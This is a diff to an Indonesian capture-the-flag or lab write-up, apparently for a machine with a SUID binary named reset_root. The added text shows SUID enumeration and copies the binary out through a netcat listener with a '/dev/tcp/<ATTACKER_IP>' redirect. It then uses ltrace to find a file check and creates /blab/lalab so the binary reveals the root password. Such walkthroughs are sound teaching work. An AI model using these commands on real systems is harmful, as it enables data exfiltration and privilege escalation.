@@ -221,19 +221,87 @@ Binary ini tidak termasuk binary standar Linux sehingga menjadi kandidat utama u
 
 # 7. Binary Analysis
 
-Binary kemudian diambil dari target untuk dianalisis lebih lanjut.
+Selama enumerasi SUID ditemukan binary menarik:
 
-Analisis menggunakan ltrace menunjukkan adanya pemeriksaan terhadap path tertentu.
-
-Contoh temuan:
-
-```text
-access("/path/yang/diperiksa")
+```bash
+find / -perm -u=s 2>/dev/null
 ```
 
-Hal ini menunjukkan bahwa binary bergantung pada keberadaan file tertentu sebelum menjalankan fungsi berikutnya.
+Output:
 
----
+```text
+/usr/bin/reset_root
+```
+
+Karena bukan binary standar Linux, binary tersebut dianalisis lebih lanjut.
+
+## Transfer Binary
+
+Binary disalin dari target ke mesin attacker untuk dianalisis secara lokal.
+
+Pada mesin attacker:
+
+```bash
+nc -lvnp 3333 > reset_root
+```
+
+Pada shell target:
+
+```bash
+cat /usr/bin/reset_root > /dev/tcp/<ATTACKER_IP>/3333
+```
+
+Setelah transfer selesai:
+
+```bash
+chmod +x reset_root
+```
+
+## Dynamic Analysis
+
+Analisis dilakukan menggunakan `ltrace` untuk melihat library call yang dipanggil program.
+
+```bash
+ltrace ./reset_root
+```
+
+Output menunjukkan adanya pengecekan terhadap file tertentu:
+
+```text
+access("/blab/lalab", F_OK) = -1
+```
+
+## Analisis
+
+Dari output tersebut dapat disimpulkan bahwa program memeriksa keberadaan file:
+
+```text
+/blab/lalab
+```
+
+Jika file tidak ada, program tidak melanjutkan ke proses berikutnya.
+
+Karena path tersebut dapat dibuat oleh user yang sedang digunakan, maka dibuat file yang diminta.
+
+Pada target:
+
+```bash
+mkdir -p /blab
+touch /blab/lalab
+```
+
+## Re-run Binary
+
+Binary dijalankan kembali:
+
+```bash
+/usr/bin/reset_root
+```
+
+Kali ini program berhasil melewati pengecekan dan menampilkan informasi sensitif berupa password root.
+
+Temuan ini menunjukkan bahwa mekanisme validasi pada binary hanya bergantung pada keberadaan file tertentu yang dapat dibuat oleh user biasa.
+
 
 # 8. Exploiting reset_root
 
